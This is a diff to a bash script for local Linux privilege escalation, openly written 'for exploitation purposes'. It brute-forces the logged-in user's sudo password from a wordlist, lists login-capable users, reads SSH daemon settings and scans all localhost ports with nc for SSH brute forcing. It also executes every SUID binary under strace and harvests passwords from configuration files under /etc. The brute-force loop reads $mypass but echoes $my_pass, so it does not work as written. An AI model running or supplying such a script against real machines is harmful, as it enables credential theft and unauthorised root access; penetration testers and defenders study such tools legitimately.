@@ -7,7 +7,7 @@ echo "Please run this script as low privilege user :]"
 echo "";
 
 currentuser=$(whoami);
-
+echo "current user and privilege is: $currentuser";
 
 # TODO make the script non interactive for exploitation purposes
 
@@ -20,16 +20,26 @@ read -r answer;
 if [ "$answer" == "Y" ] ; then
 echo "What can you do as sudo :] ?";
 sudo -l; else
-echo "Now bruteforcing the loggedin user password";
+echo "Now bruteforcing the loggedin user password through simple loop";
 while read -r mypass; do echo "$my_pass" | sudo -S id; done < wordlist.txt; fi
+
+echo "Getting valid users for login";
+validuser=$(grep -v '/false' /etc/passwd | grep -v '/nologin' | cut -d ':' -f1);
 
 echo "Brute forcing local users via su, download / compile sucrack"
 # wget
 #./sucrack wordlist.txt
 
+echo "Getting SSH permissions";
+grep -niR --color permit /etc/ssh/sshd_config;
+
+echo "Getting allow users if any in SSH config"
+grep -niR --color allowusers /etc/ssh/sshd_config;
+
 echo "Scanning localhost ports for SSH detection and brute force";
 nc -z -v 127.0.0.1 1-65535;
 echo "Select the SSH port";
+#./sshpassscript.sh wordlist
 
 #echo "Do we have access to dmesg and check privesc related information ?"
 #dmesg;
@@ -72,7 +82,7 @@ echo "[TO DO]";
 
 echo "Generating SUID logs ... you might receive some pop ups and error message since we are starting all SUID binaries.";
 mkdir -p ~/.shotologs;
-for x in $(find / -perm /4000 2>/dev/null); do timeout 30s strace "$x" 2>~/.shotologs/$(basename "$x").stracelog; done;
+for x in $(find / -perm /4000 2>/dev/null); do timeout 20s strace "$x" 2>~/.shotologs/$(basename "$x").stracelog 1>/dev/null; done;
 
 echo "Relative path opening in suid binaries, ie. you can fool the suid binary to open arbitrary file."
 grep -n 'open("\.' ~/.shotologs/* --color;
@@ -105,14 +115,14 @@ python -c "import sys; print '\n'.join(sys.path);"
 echo ""
 echo "### 5. Init.d script auditing"
 
-echo "Usage of predictable or fixed files in a writable folder"
-echo $writable;
+echo "Usage of predictable or fixed files in a writable folder";
+echo "$writable";
 grep -n -R --color ' /tmp' /etc/init.d/*;
 
 
 
 
-echo "### 6. Conf files password disclosure and password reuse"
-grep -v '^$\|^\s*\#' /etc/*.conf  | grep -i --color "password" -A1;
-grep -v '^$\|^\s*\#' /etc/*/*.conf  | grep -i --color "password" -A1;
-echo "storing passwords found ..."
+echo "### 6. Trying to file conf files including password and password reuse"
+grep -v '^$\|^\s*\#' /etc/*.conf  | grep -i --color "password";
+grep -v '^$\|^\s*\#' /etc/*/*.conf  | grep -i --color "password";
+echo "Storing passwords found ..."
